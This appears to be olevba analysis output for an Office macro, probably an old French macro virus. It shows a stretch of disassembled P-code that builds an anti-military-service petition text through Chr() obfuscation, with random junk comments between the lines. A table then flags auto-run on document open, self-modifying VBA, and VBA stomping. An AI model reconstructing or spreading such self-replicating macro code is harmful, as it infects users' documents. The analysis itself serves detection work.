' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "250"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "000"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "étudiants,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "salariés,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "rêveurs,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c1 
' 	QuoteRem 0x005A 0x000F " iifjxvhpyvjiaz"
' Line #188:
' 	LineCont 0x0004 06 00 00 00
' 	Ld c1 
' 	LitStr 0x000E "entrepreneurs,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "chômeurs,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "voyageurs"
' 	Add 
' 	St c1 
' 	QuoteRem 0x002E 0x000B " lkumnvsebq"
' Line #189:
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0002 "ou"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "tout"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "simplement"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "amoureux"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "qui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "ont"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "autres"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "projets"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "Vie"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St b2 
' 	QuoteRem 0x00E3 0x0007 " dfnlvx"
' Line #190:
' 	LineCont 0x0004 53 00 00 00
' 	Ld b2 
' 	LitStr 0x0004 "pour"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "ces"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "10"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "mois."
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "Ils"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "refusent"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "effectuer"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "un"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "inégalitaire"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St b2 
' 	BoS 0x0000 
' 	Ld b2 
' 	LitStr 0x0002 "et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "dépassé,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "bref"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "un"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "qui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "ne"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "sert"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "plus"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "rien."
' 	Add 
' 	St b2 
' 	BoS 0x0000 
' 	LitStr 0x000F "Mobilisons-nous"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "!"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "Pétition"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "pour"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "les"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B "sursitaires"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "sous"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "contrat"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "travail:"
' 	Add 
' 	St b1 
' 	QuoteRem 0x0191 0x0008 " tmvkicz"
' Line #191:
' 	LineCont 0x0008 25 00 00 00 6D 00 00 00
' 	Ld b1 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0012 "http://sn.agat.net"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "La"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "révolte"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "du"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "militaire:"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0022 "http://altern.org/gigm/service.htm"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St b1 
' 	BoS 0x0000 
' 	LitStr 0x0002 "La"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "pétition"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "du"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "magazine"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "Don"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "Quichotte:"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001B "http://www.donquichotte.com"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "Non"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "au"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "S.N."
' 	Add 
' 	St a1 
' 	QuoteRem 0x002A 0x0009 " wwwhoegm"
' Line #192:
' 	LineCont 0x0014 01 00 00 00 12 00 00 00 29 00 00 00 2E 00 00 00 42 00 00 00
' 	Ld a1 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "qui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "tue"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "emploi:"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0020 "http://www.multimania.com/antisn"
' 	Add 
' 	St a1 
' 	BoS 0x0000 
' 	LitDI2 0x0050 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e4 
' 	BoS 0x0000 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St j17 
' 	QuoteRem 0x0039 0x000E " pzhkrbjnjvpiv"
' Line #193:
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c7 
' 	QuoteRem 0x004C 0x0008 " cnwpxth"
' Line #194:
' 	EndSub 
' 	QuoteRem 0x0008 0x0008 " ozafjiz"
' Line #195:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|environ             |May read system environment variables        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://sn.agat.net  |URL                                          |
|IOC       |http://altern.org/gi|URL                                          |
|          |gm/service.htm      |                                             |
|IOC       |http://www.donquicho|URL                                          |
|          |tte.com             |                                             |
|IOC       |http://www.multimani|URL                                          |
|          |a.com/antisn        |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

